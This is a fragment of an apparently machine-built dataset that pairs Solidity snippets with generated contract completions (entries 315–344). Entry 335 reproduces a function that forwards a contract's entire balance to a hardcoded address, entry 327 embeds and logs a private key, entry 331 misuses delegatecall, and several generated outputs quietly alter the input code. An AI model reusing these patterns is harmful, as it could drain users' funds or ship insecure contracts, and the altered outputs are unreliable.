        "output": "pragma solidity ^0.5.16;\ncontract MyContract {\n    address payable private wallet;\n\n    event Received(address, uint);\n\n    constructor() public {\n        wallet = msg.sender;\n    }\n\n    function receiveMoney() public payable {\n        emit Received(msg.sender, msg.value);\n    }\n\n    function getBalance() public view returns(uint) {\n        return address(this).balance;\n    }\n\n    function withdrawMoney() public {\n        require(msg.sender == wallet, \"You are not the wallet owner\");\n        wallet.transfer(address(this).balance);\n    }\n}\n\n",
        "changed": 0
    },
    "316.sol": {
        "input": "struct inputData {\n    address admin;\n    uint256 price;\n    uint256 balance;\n    address rewardToken;\n}\n\nfunction setAllowedTokensData(address _token, inputData[] memory _data) public {\n    for (uint256 dataIndex = 0; dataIndex < _data.length; dataIndex++) {\n        allowedTokensData[_token] = allowedTokenDetails(\n            _data[dataIndex].admin,\n            _data[dataIndex].price,\n            _data[dataIndex].balance,\n            _data[dataIndex].rewardToken,\n            0, \n            block.timestamp\n        );\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TokenData {\n    struct inputData {\n        address admin;\n        uint256 price;\n        uint256 balance;\n        address rewardToken;\n    }\n\n    struct allowedTokenDetails {\n        address admin;\n        uint256 price;\n        uint256 balance;\n        address rewardToken;\n        uint256 lastUpdated;\n    }\n    \n    mapping(address => allowedTokenDetails) public allowedTokensData;\n\n    function setAllowedTokensData(address _token, inputData[] memory _data) public {\n        for (uint256 dataIndex = 0; dataIndex < _data.length; dataIndex++) {\n            allowedTokensData[_token] = allowedTokenDetails(\n                _data[dataIndex].admin,\n                _data[dataIndex].price,\n                _data[dataIndex].balance,\n                _data[dataIndex].rewardToken,\n                block.timestamp\n            );\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "317.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract GLDToken is ERC20 {\n    constructor(uint256 initialSupply) ERC20(\"Gold\", \"GLD\") {\n        _mint(msg.sender, initialSupply);\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "318.sol": {
        "input": "keccak256(addr.concat(\"5\"))); \n\nkeccak256(ethers.utils.solidityPack([\"address\", \"string\"], [addr, \"5\"]))\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function getHash(address addr) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(addr, \"5\"));\n    }\n}\n\n",
        "changed": 0
    },
    "319.sol": {
        "input": "\nfunction bookroom(uint256 _index) public payable uptofee{\n            payable(owner).transfer(msg.value);\n            roomstatus = Status.Occupied;\n            bookertoroom[msg.sender] = hotelroomsarray[_index];\n            bookertoroomTostatusofroom[roomstatus][msg.sender] = \n               hotelroomsarray[_index];        \n        }\n\n\n",
        "output": "pragma solidity ^0.7.6;\ncontract HotelBooking {\n    address payable public owner;\n    enum Status { Vacant, Occupied }\n    Status public roomstatus;\n\n    struct Room {\n        uint256 id;\n        string name;\n    }\n\n    Room[] public hotelroomsarray;\n    mapping(address => Room) public bookertoroom;\n    mapping(Status => mapping(address => Room)) public bookertoroomTostatusofroom;\n\n    // Modifier to check if msg.value is enough to cover the fee\n    modifier uptofee(uint256 _index) {\n        require(msg.value >= hotelroomsarray[_index].id, \"Not enough Ether provided.\");\n        _;\n    }\n\n    constructor() public {\n        owner = msg.sender;\n        roomstatus = Status.Vacant;\n    }\n\n    function addRoom(uint256 _id, string memory _name) public {\n        require(msg.sender == owner, \"Only the owner can add rooms.\");\n        hotelroomsarray.push(Room(_id, _name));\n    }\n\n    function bookroom(uint256 _index) public payable uptofee(_index) {\n        payable(owner).transfer(msg.value);\n        roomstatus = Status.Occupied;\n        bookertoroom[msg.sender] = hotelroomsarray[_index];\n        bookertoroomTostatusofroom[roomstatus][msg.sender] = hotelroomsarray[_index];\n    }\n}\n\n",
        "changed": 0
    },
    "320.sol": {
        "input": " Note: The called function should be payable if you send value and the \n       value you send should be less than your current balance.\n\n    constructor(uint256 _initialSupply) payable {\n            balanceOf[msg.sender] = _initialSupply;\n            totalSupply = _initialSupply;\n    }\n    \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    // Create an array with all balances\n    mapping (address => uint256) public balanceOf;\n    uint256 public totalSupply;\n\n    // Initializes contract with initial supply tokens to the creator of the contract\n    constructor(uint256 _initialSupply) payable public {\n        balanceOf[msg.sender] = _initialSupply;\n        totalSupply = _initialSupply;\n    }\n\n    // Send coins\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        require(balanceOf[msg.sender] >= _value); // Check if the sender has enough\n        require(balanceOf[_to] + _value >= balanceOf[_to]); // Check for overflows\n        balanceOf[msg.sender] -= _value; // Subtract from the sender\n        balanceOf[_to] += _value; // Add the same to the recipient\n        return true;\n    }\n}\n\n",
        "changed": 1
    },
    "321.sol": {
        "input": "function createCampaign(Reward[] memory _rewards)\n    public\n{\n    Campaign newCampaign = new Campaign(address(this), msg.sender);\n\n    for (uint256 i = 0; i < _rewards.length; i++) {\n        newCampaign.createReward(\n            _rewards[i].contribution,\n            _rewards[i].maxNumber,\n            _rewards[i].ImageLink,\n            msg.sender\n        );\n    }\n    deployedCampaigns.push(newCampaign);\n}\n\naddress factory;\naddress public manager;\n\nmodifier restrictedThroughFactory(address user) {\n    require(msg.sender == factory && user == manager);\n    _;\n}\n\nmodifier restricted() {\n    require(msg.sender == manager);\n    _;\n}\n\nconstructor(address _factory, address creator) {\n    factory = _factory;\n    manager = creator;\n}\n\nfunction createReward(\n    uint256 _contribution,\n    uint256 _maxNumber,\n    string memory _imageLink\n) public restricted {\n    _createReward(_contribution, _maxNumber, _imageLink);\n}\n\nfunction createReward(\n    uint256 _contribution,\n    uint256 _maxNumber,\n    string memory _imageLink,\n    address user\n) public restrictedThroughFactory(user) {\n    _createReward(_contribution, _maxNumber, _imageLink);\n}\n\nfunction _createReward(\n    uint256 _contribution,\n    uint256 _maxNumber,\n    string memory _imageLink\n) internal {\n    Reward memory newReward = Reward({\n        contribution: _contribution,\n        maxNumber: _maxNumber,\n        ImageLink: _imageLink\n    });\n\n    rewards.push(newReward);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "322.sol": {
        "input": "function getOwnersOwnedTokenIds(address owner) public view returns(uint256[] memory){\n  return ownerToIds[owner];\n}\n\npragma solidity ^0.8.0;\n\ncontract Test {\n\n    mapping(address => uint256[]) ownerToIds;\n\n    constructor() {\n        ownerToIds[msg.sender].push(1);\n        ownerToIds[msg.sender].push(2);\n        ownerToIds[msg.sender].push(3);\n        ownerToIds[msg.sender].push(4); \n    }\n\n    function getOwnersOwnedTokenIds(address owner) public view returns(uint256[] memory){\n        return ownerToIds[owner];\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n\n    mapping(address => uint256[]) private ownerToIds;\n\n    constructor() {\n        ownerToIds[msg.sender].push(1);\n        ownerToIds[msg.sender].push(2);\n        ownerToIds[msg.sender].push(3);\n        ownerToIds[msg.sender].push(4); \n    }\n\n    function getOwnersOwnedTokenIds(address owner) public view returns(uint256[] memory){\n        return ownerToIds[owner];\n    }\n\n}\n\n",
        "changed": 0
    },
    "323.sol": {
        "input": "pragma ever-solidity >= 0.64.0;\ncontract foo {\n constructor() public {}\n function main() public returns (string) {}\n function redeem(uint256 a, string b, uint256 c) public {}\n}\n\n{\n  \"constructor\": \"0x68b55f3f\",\n  \"main\": \"0x30992770\",\n  \"redeem\": \"0x58160fa0\"\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract foo {\n    constructor() public {\n    }\n\n    function main() public pure returns (string memory) {\n        return \"Main function executed\";\n    }\n\n    function redeem(uint256 a, string memory b, uint256 c) public pure returns (string memory) {\n        return \"Redeem function executed\";\n    }\n}\n\n",
        "changed": 0
    },
    "324.sol": {
        "input": "    function send(address payable _to) external payable {\n      _to.transfer(msg.value); \n    }\n\n    receive() external payable {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SendEther {\n    function send(address payable _to) external payable {\n        _to.transfer(msg.value);\n    }\n\n    receive() external payable {}\n}\n\n",
        "changed": 0
    },
    "325.sol": {
        "input": "bytes test = '0xabcd'\n\ntest[2:5];  # 'abc'\n\nbytes whitespaces='0x20202020202020'\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TestContract {\n\n    bytes public test = hex\"abcd\";\n    bytes public sliced;\n    bytes public whitespaces = hex\"20202020202020\";\n\n    function sliceTest() public {\n        sliced = new bytes(3);\n        for(uint i = 0; i < 3; i++) {\n            sliced[i] = test[i];\n        }\n    }\n    \n    function getSliced() public view returns (bytes memory) {\n        return sliced;\n    }\n    \n    function getWhitespaces() public view returns (bytes memory) {\n        return whitespaces;\n    }\n}\n\n",
        "changed": 0
    },
    "326.sol": {
        "input": "function getUserBalance(address _owner) external view returns (uint) {\n    return address(_owner).balance;\n}\n\nfunction getContractBalance() public view onlyOwner returns (uint) {\n        return address(this).balance;\n    }\n\nbalanceOf(owner.address)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner);\n        _;\n    }\n\n    function getUserBalance(address _owner) external view returns (uint) {\n        return _owner.balance;\n    }\n\n    function getContractBalance() public view onlyOwner returns (uint) {\n        return address(this).balance;\n    }\n\n    function balanceOf(address _owner) public view returns (uint) {\n        return _owner.balance;\n    }\n}\n\n",
        "changed": 0
    },
    "327.sol": {
        "input": "const privateKey = \"82f98661ea7e05ac4bad0965da4b8a1fab93cf27e606d1185a275c91f96aac9b\";\nconst account = web3js.eth.accounts.privateKeyToAccount('0x' + privateKey);\nweb3js.eth.accounts.wallet.add(account);\n\nconst web3 = require('web3');\nconst fs = require(\"fs\");\n\n\nconst CONTRACT_ABI = `[\n        {\n                \"anonymous\": false,\n                \"inputs\": [\n                        {\n                                \"indexed\": true,\n                                \"internalType\": \"address\",\n                                \"name\": \"previousOwner\",\n                                \"type\": \"address\"\n                        },\n                        {\n                                \"indexed\": true,\n                                \"internalType\": \"address\",\n                                \"name\": \"newOwner\",\n                                \"type\": \"address\"\n                        }\n                ],\n                \"name\": \"OwnershipTransferred\",\n                \"type\": \"event\"\n        },\n        {\n                \"inputs\": [\n                        {\n                                \"internalType\": \"string\",\n                                \"name\": \"name\",\n                                \"type\": \"string\"\n                        },\n                        {\n                                \"internalType\": \"bytes1\",\n                                \"name\": \"pin\",\n                                \"type\": \"bytes1\"\n                        }\n                ],\n                \"name\": \"addAppliance\",\n                \"outputs\": [],\n                \"stateMutability\": \"nonpayable\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [\n                        {\n                                \"internalType\": \"uint256\",\n                                \"name\": \"\",\n                                \"type\": \"uint256\"\n                        }\n                ],\n                \"name\": \"appliances\",\n                \"outputs\": [\n                        {\n                                \"internalType\": \"uint256\",\n                                \"name\": \"id\",\n                                \"type\": \"uint256\"\n                        },\n                        {\n                                \"internalType\": \"string\",\n                                \"name\": \"name\",\n                                \"type\": \"string\"\n                        },\n                        {\n                                \"internalType\": \"bool\",\n                                \"name\": \"status\",\n                                \"type\": \"bool\"\n                        },\n                        {\n                                \"internalType\": \"bytes1\",\n                                \"name\": \"pin\",\n                                \"type\": \"bytes1\"\n                        }\n                ],\n                \"stateMutability\": \"view\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [\n                        {\n                                \"internalType\": \"uint256\",\n                                \"name\": \"id\",\n                                \"type\": \"uint256\"\n                        }\n                ],\n                \"name\": \"getAppliance\",\n                \"outputs\": [\n                        {\n                                \"components\": [\n                                        {\n                                                \"internalType\": \"uint256\",\n                                                \"name\": \"id\",\n                                                \"type\": \"uint256\"\n                                        },\n                                        {\n                                                \"internalType\": \"string\",\n                                                \"name\": \"name\",\n                                                \"type\": \"string\"\n                                        },\n                                        {\n                                                \"internalType\": \"bool\",\n                                                \"name\": \"status\",\n                                                \"type\": \"bool\"\n                                        },\n                                        {\n                                                \"internalType\": \"bytes1\",\n                                                \"name\": \"pin\",\n                                                \"type\": \"bytes1\"\n                                        }\n                                ],\n                                \"internalType\": \"struct Appliance\",\n                                \"name\": \"\",\n                                \"type\": \"tuple\"\n                        }\n                ],\n                \"stateMutability\": \"view\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [],\n                \"name\": \"getAppliances\",\n                \"outputs\": [\n                        {\n                                \"components\": [\n                                        {\n                                                \"internalType\": \"uint256\",\n                                                \"name\": \"id\",\n                                                \"type\": \"uint256\"\n                                        },\n                                        {\n                                                \"internalType\": \"string\",\n                                                \"name\": \"name\",\n                                                \"type\": \"string\"\n                                        },\n                                        {\n                                                \"internalType\": \"bool\",\n                                                \"name\": \"status\",\n                                                \"type\": \"bool\"\n                                        },\n                                        {\n                                                \"internalType\": \"bytes1\",\n                                                \"name\": \"pin\",\n                                                \"type\": \"bytes1\"\n                                        }\n                                ],\n                                \"internalType\": \"struct Appliance[]\",\n                                \"name\": \"\",\n                                \"type\": \"tuple[]\"\n                        }\n                ],\n                \"stateMutability\": \"view\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [],\n                \"name\": \"getAppliancesCount\",\n                \"outputs\": [\n                        {\n                                \"internalType\": \"uint256\",\n                                \"name\": \"\",\n                                \"type\": \"uint256\"\n                        }\n                ],\n                \"stateMutability\": \"view\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [],\n                \"name\": \"owner\",\n                \"outputs\": [\n                        {\n                                \"internalType\": \"address\",\n                                \"name\": \"\",\n                                \"type\": \"address\"\n                        }\n                ],\n                \"stateMutability\": \"view\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [\n                        {\n                                \"internalType\": \"uint256\",\n                                \"name\": \"id\",\n                                \"type\": \"uint256\"\n                        }\n                ],\n                \"name\": \"removeAppliance\",\n                \"outputs\": [],\n                \"stateMutability\": \"nonpayable\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [],\n                \"name\": \"renounceOwnership\",\n                \"outputs\": [],\n                \"stateMutability\": \"nonpayable\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [\n                        {\n                                \"internalType\": \"uint256\",\n                                \"name\": \"id\",\n                                \"type\": \"uint256\"\n                        },\n                        {\n                                \"internalType\": \"bool\",\n                                \"name\": \"status\",\n                                \"type\": \"bool\"\n                        }\n                ],\n                \"name\": \"toggleAppliance\",\n                \"outputs\": [],\n                \"stateMutability\": \"nonpayable\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [\n                        {\n                                \"internalType\": \"address\",\n                                \"name\": \"newOwner\",\n                                \"type\": \"address\"\n                        }\n                ],\n                \"name\": \"transferOwnership\",\n                \"outputs\": [],\n                \"stateMutability\": \"nonpayable\",\n                \"type\": \"function\"\n        },\n        {\n                \"inputs\": [\n                        {\n                                \"internalType\": \"uint256\",\n                                \"name\": \"id\",\n                                \"type\": \"uint256\"\n                        },\n                        {\n                                \"internalType\": \"string\",\n                                \"name\": \"name\",\n                                \"type\": \"string\"\n                        },\n                        {\n                                \"internalType\": \"bytes1\",\n                                \"name\": \"pin\",\n                                \"type\": \"bytes1\"\n                        }\n                ],\n                \"name\": \"updateAppliance\",\n                \"outputs\": [],\n                \"stateMutability\": \"nonpayable\",\n                \"type\": \"function\"\n        }\n]`;\nconst CONTRACT_ADDRESS = \"0x13d9FA79D364070510B410c2FaC1976F21E3e218\";\n\nconst web3js = new web3(new web3.providers.HttpProvider(\"https:\n\n\nvar myAddress = '0x46Be881Fa6935a8FC969A4ddDFC74d625c558996';\nconst privateKey = \"82f98661ea7e05ac4bad0965da4b8a1fab93cf27e606d1185a275c91f96aac9b\";\nconst account = web3js.eth.accounts.privateKeyToAccount('0x' + privateKey);\nweb3js.eth.accounts.wallet.add(account);\n\nconsole.log(privateKey);\nvar contractABI = JSON.parse(CONTRACT_ABI);\nvar contractAddress = CONTRACT_ADDRESS;\ncontract = new web3js.eth.Contract(contractABI, contractAddress);\n\n\nfunction main() {\n\n    contract.methods.addAppliance(\"fan\", web3.utils.numberToHex(1)).send({ from: myAddress, gas: 230000 })\n        .on(\"receipt\", (receipt) => {\n            console.log(\"receipt:\");\n            console.log(receipt);\n            contract.methods.getAppliances().call({ from: myAddress }).then(res => {\n                console.log(res);\n            });\n        });\n}\n\nmain()\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract AppliancesContract {\n    struct Appliance {\n        uint256 id;\n        string name;\n        bool status;\n        bytes1 pin;\n    }\n\n    Appliance[] public appliances;\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function addAppliance(string memory name, bytes1 pin) public {\n        require(msg.sender == owner, \"Only owner can add appliances\");\n        appliances.push(Appliance(appliances.length, name, false, pin));\n    }\n\n    function getAppliance(uint256 id) public view returns (uint256, string memory, bool, bytes1) {\n        Appliance memory a = appliances[id];\n        return (a.id, a.name, a.status, a.pin);\n    }\n    \n    // Add other functions here\n}\n\n",
        "changed": 0
    },
    "328.sol": {
        "input": "function withdrawFunds() public {\n    require(msg.sender == owner, \"Only the owner can withdraw funds.\");\n    payable(msg.sender).transfer(address(this).balance);\n}\n\n\n",
        "output": "pragma solidity ^0.7.6;\ncontract SimpleBank {\n    address payable public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function depositFunds() public payable {\n        require(msg.value > 0, \"Deposit amount must be greater than 0.\");\n    }\n\n    function withdrawFunds() public {\n        require(msg.sender == owner, \"Only the owner can withdraw funds.\");\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 0
    },
    "329.sol": {
        "input": "it(\"transfers taken ownership\", async () => {\n        const dappTokenInstance = await DAppToken.deployed();\n        return await dappTokenInstance.transfer.call(accounts[1], 99999999999999999999999999999)\n       .then(assert.fail).catch((error) => {\n          assert( error.message.indexOf(\"revert\") >= 0, \"error message must contain revert\");\n    });\n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DAppToken {\n    mapping (address => uint256) public balanceOf;\n    string public name = \"DAppToken\";\n    string public symbol = \"DAPP\";\n    uint8 public decimals = 18;\n    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor() public {\n        balanceOf[msg.sender] = totalSupply;\n    }\n\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        require(balanceOf[msg.sender] >= _value, \"Insufficient balance\");\n        balanceOf[msg.sender] -= _value;\n        balanceOf[_to] += _value;\n        emit Transfer(msg.sender, _to, _value);\n        return true;\n    }\n}\n\n",
        "changed": 1
    },
    "330.sol": {
        "input": "contract Flags {\n   string public flag = unicode\"\ud83c\udde6\ud83c\udde9\";\n\n   function setFlag(string memory _flag) public {\n       flag = _flag;\n   }\n}\n\nfrom brownie import accounts, Flags\n\ndef test_unicode_string_setup():\n    contract = Flags.deploy({'from': accounts[0]})\n    assert contract.flag() == \"\ud83c\udde6\ud83c\udde9\"\n\n    # no unicode keyword    \n    contract.setFlag(\"\ud83c\udde6\ud83c\uddea\", {'from': accounts[0]})\n    assert contract.flag() == \"\ud83c\udde6\ud83c\uddea\"\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Flags {\n    string public flag;\n    \n    constructor() public {\n        flag = \"\ud83c\udde6\ud83c\udde9\";\n    }\n\n    function setFlag(string memory _flag) public {\n        flag = _flag;\n    }\n}\n\n",
        "changed": 0
    },
    "331.sol": {
        "input": "(bool success,) =    usdcAddress.delegatecall(abi.encodeWithSignature('approve(address,uint256)', address(this), amount));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function approve(address spender, uint256 value) external returns (bool);\n}\n\ncontract MyContract {\n    IERC20 public usdc;\n\n    constructor(address _usdc) {\n        usdc = IERC20(_usdc);\n    }\n\n    function delegateApprove(address _usdcAddress, uint256 amount) public {\n        (bool success,) = _usdcAddress.delegatecall(abi.encodeWithSignature('approve(address,uint256)', address(this), amount));\n        require(success, \"delegatecall not successful\");\n    }\n}\n\n",
        "changed": 1
    },
    "332.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyToken {\n    mapping (address => uint256) balanceOf;\n    address gameContractAddress;\n    \n    function transferForGame(address _receiver, uint256 _amount) external {\n        require(msg.sender == gameContractAddress, 'Only the game can perform this transfer');\n        balanceOf[gameContractAddress] -= _amount;\n        balanceOf[_receiver] += _amount;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyToken {\n    mapping (address => uint256) balanceOf;\n    address gameContractAddress;\n    \n    function transferForGame(address _receiver, uint256 _amount) external {\n        require(msg.sender == gameContractAddress, 'Only the game can perform this transfer');\n        balanceOf[gameContractAddress] -= _amount;\n        balanceOf[_receiver] += _amount;\n    }\n}\n\n",
        "changed": 0
    },
    "333.sol": {
        "input": "firstContract._admin.transfer(value);\n\naddress payable public _admin;\n\nfirstContract._admin().transfer(value);\n\nconstructor(address _address) payable {\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address payable public _admin;\n    uint value;\n\n    constructor(address _address) payable {\n        _admin = payable(_address);\n        value = msg.value;\n    }\n\n    function transferFunds() public {\n        require(msg.sender == _admin, \"Only admin can transfer funds\");\n        _admin.transfer(value);\n    }\n}\n\n",
        "changed": 0
    },
    "334.sol": {
        "input": "pragma solidity ^0.8.0;\n\nIMPORT \"@openzeppelin/contracts/tokens/ERC20/IERC20.sol\";\n\n\ncontract Testing{\n    address public manager;\n    IERC20 wETH;\n\n    constructor(IERC20 _wETH){\n         manager =msg.sender;\n         wETH = _wETH;\n    }\n\n    function getMoneyFromManager(uint quantity) public payable{\n        wETH.transferFrom(manager, msg.sender, quantity)\n    }\n\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "335.sol": {
        "input": "function action() public payable { \n    payable(manager.uniswapDepositAddress()).transfer(address(this).balance);\n}\n\ncontract Manager {\n    function performTasks() public {\n        \n    }\n\n    function uniswapDepositAddress() public pure returns (address) {\n        return 0x68aDe5BBcF885dA1590A216563344307BaFab595;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    // Manager instance\n    Manager public manager;\n\n    // Contract constructor receiving Manager contract address\n    constructor(Manager _manager) {\n        manager = _manager;\n    }\n\n    // Action function\n    function action() public payable { \n        payable(manager.uniswapDepositAddress()).transfer(address(this).balance);\n    }\n}\n\ncontract Manager {\n    // PerformTasks function\n    function performTasks() public {\n        \n    }\n\n    // UniswapDepositAddress function\n    function uniswapDepositAddress() public pure returns (address) {\n        return 0x68aDe5BBcF885dA1590A216563344307BaFab595;\n    }\n}\n\n",
        "changed": 0
    },
    "336.sol": {
        "input": "function safeApprove(IERC20 token, address spender, uint256 value) internal\n{ \n\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "337.sol": {
        "input": " it(\"Address #1 can't burn 100M tokens\", async function () {\n    await expect(contract.connect(signer1)\n      .burn(token_amount)\n      .to.be.revertedWith('revert ERC20: burn amount exceeds balance')\n  });\n\n\n",
        "output": "",
        "changed": 0
    },
    "338.sol": {
        "input": "function utilityFunction(string[2] storage _list1, string[3] storage _list2) internal pure returns (uint256 result) {\n\nfunction entryPoint() public view returns (uint256) {\n    string[] memory _list1 = new string[](2);\n    _list1[0] = list1[0];\n    _list1[1] = list1[1];\n\n    string[] memory _list2 = new string[](3);\n    _list2[0] = list2[0];\n    _list2[1] = list2[1];\n    _list2[2] = list2[2];\n\n    return utilityFunction(_list1, _list2);\n}\n\nfunction utilityFunction(string[] memory _list1, string[] memory _list2) internal pure returns (uint256 result) {\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    string[2] list1;\n    string[3] list2;\n    \n    function setList1(string[2] memory _list1) public {\n        list1 = _list1;\n    }\n    \n    function setList2(string[3] memory _list2) public {\n        list2 = _list2;\n    }\n\n    function entryPoint() public view returns (uint256) {\n        string[] memory _list1 = new string[](2);\n        _list1[0] = list1[0];\n        _list1[1] = list1[1];\n\n        string[] memory _list2 = new string[](3);\n        _list2[0] = list2[0];\n        _list2[1] = list2[1];\n        _list2[2] = list2[2];\n\n        return utilityFunction(_list1, _list2);\n    }\n\n    function utilityFunction(string[] memory _list1, string[] memory _list2) internal pure returns (uint256 result) {\n        // Add your logic here\n        result = _list1.length + _list2.length;  // Example logic\n        return result;\n    }\n}\n\n",
        "changed": 0
    },
    "339.sol": {
        "input": "function createCampaign(string memory _campaignTitle, string memory _campaignDescription, uint256 _goalAmount, uint256 _fundingPeriodInDays ) public {\n        ++totalCampaigns;\n\n        uint256 period = block.timestamp + (_fundingPeriodInDays * 1 days);\n\n        Campaign storage aCampaign = campaigns[totalCampaigns];\n\n        aCampaign.campaignOwner = payable(msg.sender);\n        aCampaign.campaignTitle = _campaignTitle;\n        aCampaign.campaignDescription = _campaignDescription;\n        aCampaign.goalAmount = _goalAmount;\n        aCampaign.totalAmountFunded = 0;\n        aCampaign.deadline = period;\n        aCampaign.goalAchieved = false;\n        aCampaign.isCampaignOpen = true;\n        aCampaign.isExists = true;\n     } \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Crowdfunding {\n    struct Campaign {\n        address payable campaignOwner;\n        string campaignTitle;\n        string campaignDescription;\n        uint256 goalAmount;\n        uint256 totalAmountFunded;\n        uint256 deadline;\n        bool goalAchieved;\n        bool isCampaignOpen;\n        bool isExists;\n    }\n\n    uint256 public totalCampaigns;\n    mapping(uint256 => Campaign) public campaigns;\n\n    constructor() {\n        totalCampaigns = 0;\n    }\n\n    function createCampaign(string memory _campaignTitle, string memory _campaignDescription, uint256 _goalAmount, uint256 _fundingPeriodInDays ) public {\n        ++totalCampaigns;\n\n        uint256 period = block.timestamp + (_fundingPeriodInDays * 1 days);\n\n        Campaign storage aCampaign = campaigns[totalCampaigns];\n\n        aCampaign.campaignOwner = payable(msg.sender);\n        aCampaign.campaignTitle = _campaignTitle;\n        aCampaign.campaignDescription = _campaignDescription;\n        aCampaign.goalAmount = _goalAmount;\n        aCampaign.totalAmountFunded = 0;\n        aCampaign.deadline = period;\n        aCampaign.goalAchieved = false;\n        aCampaign.isCampaignOpen = true;\n        aCampaign.isExists = true;\n    } \n}\n\n",
        "changed": 0
    },
    "340.sol": {
        "input": "sendMoney() public payable  {\n    address payable receiver = \n    payable(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2);\n\n    (bool sent, bytes memory data) = receiver.call{ value:  1 ether }(\"\");\n    require(sent, \"Failed to send Ether\");\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SendMoney {\n    function sendMoney() public payable  {\n        address payable receiver = payable(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2);\n        (bool sent, bytes memory data) = receiver.call{ value:  1 ether }(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\n",
        "changed": 0
    },
    "341.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    struct People {\n        uint256 FavouriteNumber;\n        string name;\n    }\n\n    People public person = People({FavouriteNumber: 2, name: \"MB\"});\n}\n\nuint256 number = uint8(100); \nbytes b = \"hello\"; \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct People {\n        uint256 FavouriteNumber;\n        string name;\n    }\n\n    People public person = People({FavouriteNumber: 2, name: \"MB\"});\n    \n    uint256 public number;\n    bytes public b;\n    \n    constructor() {\n        number = uint256(100); \n        b = \"hello\"; \n    }\n}\n\n",
        "changed": 0
    },
    "342.sol": {
        "input": "import \"@openzeppelin/contracts/access/Ownable.sol\";\n\nfunction stoler() public onlyOwner {\n    yourToken.transfer(msg.sender, 1);\n }\n\nmodifier [NAMEMODIFIER] {\n    _;\n}\n\nfunction stoler() public [NAMEMODIFIER] {\n        yourToken.transfer(msg.sender, 1);\n     }\n\n\n",
        "output": "",
        "changed": 0
    },
    "343.sol": {
        "input": "const contract = new ethers.Contract(contractAddress, ABI, signer);\n\nconst returnedValue = await contract.someMethod(someArgument)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleContract {\n    // Variables\n    address public contractAddress;\n    address public signer;\n    uint256 public someArgument;\n\n    // Events\n    event ReturnedValue(uint256 value);\n\n    // Constructor\n    constructor(address _contractAddress, address _signer, uint256 _someArgument) {\n        contractAddress = _contractAddress;\n        signer = _signer;\n        someArgument = _someArgument;\n    }\n\n    // Some method\n    function someMethod(uint256 _someArgument) public returns (uint256) {\n        someArgument = _someArgument;\n        emit ReturnedValue(someArgument);\n        return someArgument;\n    }\n}\n\n",
        "changed": 0
    },
    "344.sol": {
